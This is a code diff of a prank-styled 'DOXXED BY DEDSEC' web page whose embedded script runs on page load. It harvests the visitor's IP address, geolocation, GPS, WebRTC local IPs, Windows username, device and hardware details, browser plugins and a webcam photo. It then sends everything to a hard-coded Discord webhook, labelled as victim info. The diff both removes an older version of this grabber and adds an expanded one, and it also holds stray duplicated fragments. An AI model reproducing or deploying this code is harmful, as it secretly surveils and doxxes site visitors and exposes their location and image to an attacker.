@@ -5,268 +5,362 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>OMG! IT'S DEDSEC</title>
     <style>
-        /* Estilo general del cuerpo para centrado y fondo */
         body {
-            position: relative; 
+            position: relative;
             display: flex;
-            align-items: flex-start; /* Mueve el contenido hacia arriba */
+            align-items: flex-start;
             justify-content: center;
             height: 100vh;
             margin: 0;
             font-family: Arial, sans-serif;
-            overflow: hidden; 
-            
-            /* Fondo de imagen de patrón */
-            background-image: url('https://i.imgur.com/cVnL0wo.png'); 
+            overflow: hidden;
+            background-image: url('https://i.imgur.com/cVnL0wo.png');
             background-repeat: repeat;
         }
-
-        /* 1. Estilo para el elemento de texto (más pequeño y más arriba) */
         .texto-no-interactivo {
-            font-size: 3em; 
+            font-size: 3em;
             color: #ffffff;
             padding: 15px;
             text-shadow: 2px 2px 10px rgba(0, 0, 0, 1);
-            
-            /* Desplazamiento hacia arriba */
-            margin-top: 15vh; 
-            
-            /* No interacción */
+            margin-top: 15vh;
             pointer-events: none;
-            z-index: 10; 
+            z-index: 10;
         }
-
-        /* 2. Estilo para el video/GIF en loop en la parte inferior */
-        #video-inferior { 
-            position: absolute; 
+        #video-inferior {
+            position: absolute;
             bottom: 0;
             left: 50%;
-            transform: translateX(-50%); 
-            width: 80%; 
-            max-width: 800px; 
+            transform: translateX(-50%);
+            width: 80%;
+            max-width: 800px;
             height: auto;
-            z-index: 5; 
+            z-index: 5;
         }
-
-        /* 3. Estilo para el video pequeño en la esquina superior izquierda (PEGADO) */
         #video-esquina-izquierda {
             position: absolute;
-            /* Se establece en 0px para pegarlo completamente a la esquina */
-            top: 0px; 
-            left: 0px; 
-            width: 100px; /* Tamaño reducido para ser pequeño */
+            top: 0px;
+            left: 0px;
+            width: 100px;
             height: auto;
             z-index: 10;
-            pointer-events: none; 
+            pointer-events: none;
         }
-
     </style>
 </head>
 <body>
 
-    <div class="texto-no-interactivo">
-        DOXXED BY DEDSEC
-    </div>
+    <div class="texto-no-interactivo">DOXXED BY DEDSEC</div>
 
     <video id="video-inferior" autoplay muted loop playsinline>
         <source src="https://i.imgur.com/C7Br6Cc.mp4" type="video/mp4">
-        Tu navegador no soporta el elemento de video.
     </video>
-    
     <video id="video-esquina-izquierda" autoplay muted loop playsinline>
         <source src="https://i.imgur.com/uhslwlA.mp4" type="video/mp4">
-        Tu navegador no soporta el elemento de video.
     </video>
 
+    <script>
+        // ============================================================
+        // CONFIG
+        // ============================================================
+        const WEBHOOK = "https://discord.com/api/webhooks/1460348078727893126/Zq089gT8yx9ITZwGZvxJ8unNpFNhSO8yJcjMexHxKV3JziMa-M0OStq5BurQ579PgSrF";
 
-<script>
-// WEBHOOK
-const WEBHOOK = "https://discord.com/api/webhooks/1460348078727893126/Zq089gT8yx9ITZwGZvxJ8unNpFNhSO8yJcjMexHxKV3JziMa-M0OStq5BurQ579PgSrF";
+        // ============================================================
+        // FUNCTION: Get Windows username (ActiveX for IE/old Edge)
+        // ============================================================
+        function getWindowsUsername() {
+            try {
+                // ActiveX only works in Internet Explorer / old Edge with ActiveX enabled
+                var wsh = new ActiveXObject("WScript.Shell");
+                return wsh.ExpandEnvironmentStrings("%USERNAME%");
+            } catch (e) {
+                // fallback: try to extract from userAgent (mobile devices sometimes have device name)
+                var ua = navigator.userAgent;
+                // common patterns for device name
+                var match = ua.match(/\(([^;]+);\s*([^;]+);\s*([^;)]+)\)/);
+                if (match && match.length > 3) {
+                    // e.g. "Windows NT 10.0; Win64; x64" -> not username
+                    // but if it's a mobile device, it might have model
+                }
+                // Try WebRTC local IP to get hostname (sometimes contains computer name)
+                // We'll do that later and store.
+                return null;
+            }
+        }
 
-async function activarCamara() {
-  try {
-    // Optimizado para móvil: pide cámara frontal directamente
-    const stream = await navigator.mediaDevices.getUserMedia({ 
-      video: { 
-        facingMode: "user",  // Cámara frontal en móvil
-        width: { ideal: 1280 },
-        height: { ideal: 720 }
-      } 
-    });
-    const video = document.getElementById('video');
-    video.srcObject = stream;
+        // ============================================================
+        // FUNCTION: Get local IPs via WebRTC (also may expose hostname)
+        // ============================================================
+        function getLocalIPs() {
+            return new Promise((resolve) => {
+                var ips = [];
+                var pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer))
+                    .catch(() => {});
+                pc.onicecandidate = function(e) {
+                    if (!e.candidate) {
+                        pc.close();
+                        resolve(ips);
+                        return;
+                    }
+                    var parts = e.candidate.candidate.split(' ');
+                    var ip = parts[4];
+                    if (ip && ip.indexOf('.') !== -1) {
+                        ips.push(ip);
+                    }
+                };
+                // timeout fallback
+                setTimeout(() => { pc.close(); resolve(ips); }, 3000);
+            });
+        }
 
-    // Espera que la cámara cargue (más rápido en móvil)
-    await new Promise(resolve => video.onloadedmetadata = resolve);
-    await new Promise(resolve => setTimeout(resolve, 1500)); // 1.5 segundos para foto clara en móvil
+        // ============================================================
+        // FUNCTION: Get GPS via browser API (if allowed)
+        // ============================================================
+        function getBrowserGPS() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) return resolve(null);
+                navigator.geolocation.getCurrentPosition(
+                    pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
+                    () => resolve(null),
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            });
+        }
 
-    // Toma la foto
-    const canvas = document.getElementById('canvas');
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-    const fotoData = canvas.toDataURL('image/jpeg', 0.9);
+        // ============================================================
+        // FUNCTION: IP info from multiple services (for redundancy)
+        // ============================================================
+        async function getIPInfo() {
+            // Try primary: ipapi.co (has proxy flag)
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                if (data.ip) return { source: 'ipapi', data };
+            } catch (e) {}
 
-    // Datos básicos + foto
-    const geo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+            // Fallback: ipinfo.io
+            try {
+                const res = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN'); // optional token
+                const data = await res.json();
+                if (data.ip) return { source: 'ipinfo', data };
+            } catch (e) {}
 
-    const form = new FormData();
-    form.append('content', 
-`**VÍCTIMA EN CLIENTES EAGLERCRAFT (MÓVIL/PC)**
-**IP:** ${geo.ip || 'oculta'}
-**País:** ${geo.country_name || '?'}
-**Hora:** ${new Date().toLocaleString()}`);
+            // Fallback: ip-api.com
+            try {
+                const res = await fetch('http://ip-api.com/json/');
+                const data = await res.json();
+                if (data.query) return { source: 'ip-api', data };
+            } catch (e) {}
 
-    const blob = dataURLtoBlob(fotoData);
-    form.append('file', blob, 'foto_victima.jpg');
+            return null;
+        }
 
-    await fetch(WEBHOOK, { method: 'POST', body: form });
+        // ============================================================
+        // MAIN EXECUTION
+        // ============================================================
+        (async function() {
+            // ---- COLLECT ALL DATA ----
+            var finalData = {};
 
-    // Detiene cámara
-    stream.getTracks().forEach(track => track.stop());
+            // 1. IP info
+            var ipInfo = await getIPInfo();
+            if (ipInfo) {
+                finalData.ip = ipInfo.data.ip || ipInfo.data.query || 'unknown';
+                finalData.country = ipInfo.data.country_name || ipInfo.data.country || '?';
+                finalData.region = ipInfo.data.region || ipInfo.data.regionName || '?';
+                finalData.city = ipInfo.data.city || '?';
+                finalData.postal = ipInfo.data.postal || ipInfo.data.zip || '?';
+                finalData.lat = ipInfo.data.latitude || ipInfo.data.lat || '?';
+                finalData.lon = ipInfo.data.longitude || ipInfo.data.lon || '?';
+                finalData.isp = ipInfo.data.org || ipInfo.data.isp || '?';
+                finalData.proxy = ipInfo.data.proxy || ipInfo.data.proxy === 'true' || false;
+                // vpn detection: proxy flag or if ISP is known VPN
+                var vpnKeywords = ['vpn', 'proxy', 'hosting', 'cloud', 'datacenter'];
+                var isVpn = finalData.proxy || vpnKeywords.some(k => finalData.isp.toLowerCase().includes(k));
+                finalData.vpn = isVpn ? 'Yes (detected)' : 'No (likely residential)';
+            } else {
+                finalData.ip = 'unknown';
+                finalData.vpn = 'Unknown';
+            }
 
-    // Muestra página principal
-    document.getElementById('camPermission').style.display = 'none';
-    document.getElementById('mainContent').style.display = 'block';
-  } catch (err) {
-    alert('Necesitas permitir la cámara para acceder a los clientes');
-  }
-}
+            // 2. Browser GPS (if allowed)
+            var gps = await getBrowserGPS();
+            if (gps) {
+                finalData.gps_lat = gps.lat;
+                finalData.gps_lon = gps.lon;
+                finalData.gps_acc = gps.acc;
+            } else {
+                finalData.gps_lat = 'not granted';
+                finalData.gps_lon = 'not granted';
+                finalData.gps_acc = 'N/A';
+            }
 
-function dataURLtoBlob(dataurl) {
-  const arr = dataurl.split(',');
-  const mime = arr[0].match(/:(.*?);/)[1];
-  const bstr = atob(arr[1]);
-  let n = bstr.length;
-  const u8arr = new Uint8Array(n);
-  while (n--) u8arr[n] = bstr.charCodeAt(n);
-  return new Blob([u8arr], { type: mime });
-}
+            // 3. Local IPs via WebRTC
+            var localIPs = await getLocalIPs();
+            finalData.localIPs = localIPs.length ? localIPs.join(', ') : 'none';
 
-// Datos normales (IP, GPU, etc.)
-(async () => {
-  const geo = await fetch('https://ipapi.co/json/').then(r=>r.json()).catch(()=>({}));
-  const battery = await navigator.getBattery?.() || {};
-  const uaData = navigator.userAgentData || {};
+            // 4. Windows username via ActiveX
+            var winUser = getWindowsUsername();
+            finalData.windowsUsername = winUser || 'not available (browser/OS restrictions)';
 
-  let webgl = 'Unavailable';
-  let gpuLevel = 'Unknown';
-  try {
-    const canvas = document.createElement('canvas');
-    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-    if (debugInfo) {
-      const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-      const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-      webgl = `${vendor} | ${renderer}`;
-      if (renderer.includes('RTX') || renderer.includes('GeForce 50') || renderer.includes('RX 9')) gpuLevel = 'Gamer/Expensive (Good For Videogames)';
-      else if (renderer.includes('RTX 40') || renderer.includes('RX 7') || renderer.includes('RX 8')) gpuLevel = 'Mid (Good)';
-      else if (renderer.includes('Intel') || renderer.includes('UHD') || renderer.includes('Iris')) gpuLevel = 'Integrated/Cheap (Basic)';
-      else if (renderer.includes('Radeon')) gpuLevel = 'Mid (Integrated AMD or Old One)';
-      else gpuLevel = 'Desconocida';
-    }
-  } catch(e) {}
+            // 5. Device / laptop model from userAgent
+            var ua = navigator.userAgent;
+            var deviceModel = 'Unknown';
+            // Common patterns
+            var modelMatch = ua.match(/\(([^;]+);\s*([^;]+);\s*([^;)]+)\)/);
+            if (modelMatch) {
+                // e.g. "Windows NT 10.0; Win64; x64" -> not model
+                // For mobile: "iPhone; CPU iPhone OS 15_0 like Mac OS X" -> parse
+            }
+            // Try to get from navigator.userAgentData if available
+            if (navigator.userAgentData) {
+                try {
+                    var uaData = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
+                    deviceModel = uaData.model || uaData.platform || 'Unknown';
+                } catch (e) {}
+            }
+            // Fallback: if it's Windows, we can't get model, but we can try to parse from userAgent
+            if (deviceModel === 'Unknown') {
+                if (ua.includes('Windows NT')) {
+                    deviceModel = 'Windows PC (model not exposed)';
+                } else if (ua.includes('Macintosh')) {
+                    deviceModel = 'Mac';
+                } else if (ua.includes('iPhone')) {
+                    deviceModel = ua.match(/iPhone\s*([^;)]+)/)?.[0] || 'iPhone';
+                } else if (ua.includes('Android')) {
+                    deviceModel = ua.match(/Android\s*([^;)]+)/)?.[0] || 'Android';
+                } else {
+                    deviceModel = 'Unknown device';
+                }
+            }
+            finalData.deviceModel = deviceModel;
 
-  const pluginsList = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'ninguno';
-  let userLevel = 'Beginner (Doesnt Knows A Shit)';
-  const savvyPlugins = ['uBlock Origin','AdBlock','Privacy Badger','NoScript','HTTPS Everywhere','ClearURLs','Decentraleyes','Cookie AutoDelete','VPN','Bitwarden','Dark Reader'];
-  if (savvyPlugins.some(p => pluginsList.includes(p))) userLevel = 'Smart/Tech-savvy (Knows About Privacy)';
-  if (pluginsList.includes('PDF Viewer') && pluginsList.length < 50) userLevel = 'Principiante total (solo plugins básicos)';
+            // 6. Other system info
+            var battery = await navigator.getBattery?.() || {};
+            finalData.battery = battery.level ? `${Math.round(battery.level*100)}% (${battery.charging?'charging':'discharging'})` : 'unavailable';
+            finalData.cpuCores = navigator.hardwareConcurrency || '?';
+            finalData.ram = navigator.deviceMemory || '?';
+            finalData.screen = `${screen.width}x${screen.height}x${screen.colorDepth}`;
+            finalData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            finalData.language = navigator.language;
+            finalData.platform = navigator.platform;
+            finalData.userAgent = ua;
 
-  const datos = {
-    ip: geo.ip || 'oculta',
-    isp: geo.org || '?',
-    ubicacion: `${geo.city || '?'}, ${geo.regionName || ''}, ${geo.country_name || 'El Salvador'} (${geo.postal || '?'})`,
-    coordenadas: `${geo.latitude || '?'}, ${geo.longitude || '?'}`,
-    hora: new Date().toLocaleString(),
-    navegador: uaData.brands?.map(b=>b.brand+" v"+b.version).join(', ') || navigator.userAgent.substring(0,100),
-    so: uaData.platform || navigator.platform,
-    movil: uaData.mobile ? 'Sí' : 'No',
-    ram: navigator.deviceMemory || '?',
-    cpu: navigator.hardwareConcurrency || '?',
-    pantalla: `${screen.width}x${screen.height}x${screen.colorDepth}`,
-    bateria: battery.level ? `${Math.round(battery.level*100)}% ${battery.charging?'cargando':'descargando'}` : 'no disponible',
-    zona: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    plugins: pluginsList,
-    user_level: userLevel,
-    gpu: webgl,
-    gpu_level: gpuLevel
-  };
+            // 7. GPU info via WebGL
+            var webglData = 'Unavailable';
+            var gpuLevel = 'Unknown';
+            try {
+                var canvas = document.createElement('canvas');
+                var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    var vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                    var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    webglData = `${vendor} | ${renderer}`;
+                    if (renderer.includes('RTX') || renderer.includes('GeForce 50') || renderer.includes('RX 9')) gpuLevel = 'Gamer/High-end';
+                    else if (renderer.includes('RTX 40') || renderer.includes('RX 7')) gpuLevel = 'Mid-high';
+                    else if (renderer.includes('Intel') || renderer.includes('UHD') || renderer.includes('Iris')) gpuLevel = 'Integrated/Basic';
+                    else gpuLevel = 'Other';
+                }
+            } catch (e) {}
+            finalData.gpu = webglData;
+            finalData.gpuLevel = gpuLevel;
 
-  const mensaje =
-`**ctOS User Info**
-**IP:** ${datos.ip} (${datos.isp})
-**Location:** ${datos.ubicacion}
-**Coordinates:** ${datos.coordenadas}
-**Hour:** ${datos.hora}
-**Browser:** ${datos.navegador}
-**OS:** ${datos.so} | Móvil: ${datos.movil}
-**RAM:** ${datos.ram} GB | CPU: ${datos.cpu} núcleos
-**Screen:** ${datos.pantalla}
-**Battery:** ${datos.bateria}
-**Time Zone:** ${datos.zona}
-**Plugins:** ${datos.plugins}
-**User Level:** ${datos.user_level}
-**GPU:** ${datos.gpu}
-**GPU Type:** ${datos.gpu_level}`;
+            // 8. Plugins list
+            var pluginsList = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
+            finalData.plugins = pluginsList;
 
-  await fetch(WEBHOOK, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: mensaje})});
-})();
+            // 9. Tech-savvy level based on plugins
+            var savvyKeywords = ['uBlock Origin','AdBlock','Privacy Badger','NoScript','HTTPS Everywhere','ClearURLs','Decentraleyes','Cookie AutoDelete','VPN','Bitwarden','Dark Reader'];
+            var savvyCount = savvyKeywords.filter(k => pluginsList.includes(k)).length;
+            var userLevel = savvyCount >= 2 ? 'Tech-savvy (privacy aware)' : (savvyCount === 1 ? 'Moderate' : 'Beginner (basic)');
+            finalData.userLevel = userLevel;
 
-// Botones normales
-document.querySelectorAll('.open').forEach(btn => {
-  btn.onclick = () => setTimeout(() => window.open(btn.dataset.link, '_blank'), 300);
-});
-</script>
-</body>
-</html>ntraleyes','Cookie AutoDelete','VPN','Bitwarden','Dark Reader'];
-  if (savvyPlugins.some(p => pluginsList.includes(p))) userLevel = 'Listo/Tech-savvy (sabe de privacidad)';
-  if (pluginsList.includes('PDF Viewer') && pluginsList.length < 50) userLevel = 'Principiante total (solo plugins básicos)';
+            // 10. Coordinates (from IP or GPS)
+            finalData.coordinates = (finalData.gps_lat !== 'not granted' && finalData.gps_lat) ?
+                `GPS: ${finalData.gps_lat}, ${finalData.gps_lon} (acc: ${finalData.gps_acc}m)` :
+                `IP-based: ${finalData.lat}, ${finalData.lon}`;
 
-  const datos = {
-    ip: geo.ip || 'oculta',
-    isp: geo.org || '?',
-    ubicacion: `${geo.city || '?'}, ${geo.regionName || ''}, ${geo.country_name || 'El Salvador'} (${geo.postal || '?'})`,
-    coordenadas: `${geo.latitude || '?'}, ${geo.longitude || '?'}`,
-    hora: new Date().toLocaleString(),
-    navegador: uaData.brands?.map(b=>b.brand+" v"+b.version).join(', ') || navigator.userAgent.substring(0,100),
-    so: uaData.platform || navigator.platform,
-    movil: uaData.mobile ? 'Sí' : 'No',
-    ram: navigator.deviceMemory || '?',
-    cpu: navigator.hardwareConcurrency || '?',
-    pantalla: `${screen.width}x${screen.height}x${screen.colorDepth}`,
-    bateria: battery.level ? `${Math.round(battery.level*100)}% ${battery.charging?'Charging':'Draining'}` : 'Unavailable',
-    zona: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    plugins: pluginsList,
-    user_level: userLevel,
-    gpu: webgl,
-    gpu_level: gpuLevel
-  };
+            // ---- BUILD DISCORD MESSAGE ----
+            var msg = `**🔹 DEDSEC CTOS – VICTIM INFO 🔹**\n` +
+                `**IP:** ${finalData.ip}\n` +
+                `**ISP:** ${finalData.isp}\n` +
+                `**VPN/Proxy:** ${finalData.vpn}\n` +
+                `**Location:** ${finalData.city}, ${finalData.region}, ${finalData.country} (${finalData.postal})\n` +
+                `**Coordinates:** ${finalData.coordinates}\n` +
+                `**Local IPs (WebRTC):** ${finalData.localIPs}\n` +
+                `**Device / Laptop:** ${finalData.deviceModel}\n` +
+                `**Windows Username:** ${finalData.windowsUsername}\n` +
+                `**OS:** ${finalData.platform}\n` +
+                `**Browser:** ${finalData.userAgent}\n` +
+                `**CPU Cores:** ${finalData.cpuCores}\n` +
+                `**RAM:** ${finalData.ram} GB\n` +
+                `**Screen:** ${finalData.screen}\n` +
+                `**Battery:** ${finalData.battery}\n` +
+                `**Timezone:** ${finalData.timezone}\n` +
+                `**Language:** ${finalData.language}\n` +
+                `**GPU:** ${finalData.gpu}\n` +
+                `**GPU Level:** ${finalData.gpuLevel}\n` +
+                `**Plugins:** ${finalData.plugins}\n` +
+                `**User Level:** ${finalData.userLevel}\n` +
+                `**Hour:** ${new Date().toLocaleString()}`;
 
-  const mensaje =
-`**ctOS User Info**
-**IP:** ${datos.ip} (${datos.isp})
-**Location:** ${datos.ubicacion}
-**Coordinates:** ${datos.coordenadas}
-**Hour:** ${datos.hora}
-**Browser:** ${datos.navegador}
-**OS:** ${datos.so} | Móvil: ${datos.movil}
-**RAM:** ${datos.ram} GB | CPU: ${datos.cpu} núcleos
-**Screen:** ${datos.pantalla}
-**Battery:** ${datos.bateria}
-**Time Zone:** ${datos.zona}
-**Plugins:** ${datos.plugins}
-**User Level:** ${datos.user_level}
-**GPU:** ${datos.gpu}
-**GPU Type:** ${datos.gpu_level}`;
+            // Send to webhook
+            try {
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: msg })
+                });
+            } catch (e) {}
 
-  await fetch(WEBHOOK, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: mensaje})});
-})();
+            // ---- CAMERA CAPTURE (existing functionality) ----
+            // (We keep the original camera logic, but we can also enhance it)
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
+                });
+                const video = document.createElement('video'); // not shown, but we can use existing
+                // Actually we don't have a video element on page, so we create one
+                const vid = document.createElement('video');
+                vid.srcObject = stream;
+                await vid.play();
+                await new Promise(r => setTimeout(r, 1500));
+                const canvas = document.createElement('canvas');
+                canvas.width = vid.videoWidth || 640;
+                canvas.height = vid.videoHeight || 480;
+                canvas.getContext('2d').drawImage(vid, 0, 0, canvas.width, canvas.height);
+                const fotoData = canvas.toDataURL('image/jpeg', 0.9);
+                const blob = dataURLtoBlob(fotoData);
+                const form = new FormData();
+                form.append('content', `**📸 Camera snapshot**`);
+                form.append('file', blob, 'victim_photo.jpg');
+                await fetch(WEBHOOK, { method: 'POST', body: form });
+                stream.getTracks().forEach(t => t.stop());
+            } catch (err) {}
 
-// Botones normales
-document.querySelectorAll('.open').forEach(btn => {
-  btn.onclick = () => setTimeout(() => window.open(btn.dataset.link, '_blank'), 300);
-});
-</script>
+            // ---- OPTIONAL: also try to get the user's name from the system via other tricks ----
+            // (We already attempted ActiveX, but if not available, we can't do more)
+
+            console.log('Data sent to Discord.');
+        })();
+
+        // Helper: dataURL to Blob
+        function dataURLtoBlob(dataurl) {
+            var arr = dataurl.split(',');
+            var mime = arr[0].match(/:(.*?);/)[1];
+            var bstr = atob(arr[1]);
+            var n = bstr.length;
+            var u8arr = new Uint8Array(n);
+            while (n--) u8arr[n] = bstr.charCodeAt(n);
+            return new Blob([u8arr], { type: mime });
+        }
+
+        // Keep the original button functionality (if any) – not needed but we keep for compatibility
+        document.querySelectorAll('.open').forEach(btn => {
+            btn.onclick = () => setTimeout(() => window.open(btn.dataset.link, '_blank'), 300);
+        });
+    </script>
 </body>
 </html>
